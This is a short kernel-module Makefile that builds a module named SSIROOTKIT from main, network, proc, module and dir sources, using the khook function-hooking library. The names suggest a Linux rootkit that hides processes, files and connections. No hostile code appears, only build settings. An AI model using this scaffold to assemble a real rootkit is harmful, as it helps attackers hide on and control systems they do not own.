MODNAME	?= SSIROOTKIT
include /home/anass/myprojects/khook/Makefile.khook
obj-m := $(MODNAME).o

$(MODNAME)-y += main.o network.o proc.o module.o dir.o  $(KHOOK_GOALS)

ccflags-y += $(KHOOK_CCFLAGS)

ldflags-y += $(KHOOK_LDFLAGS)

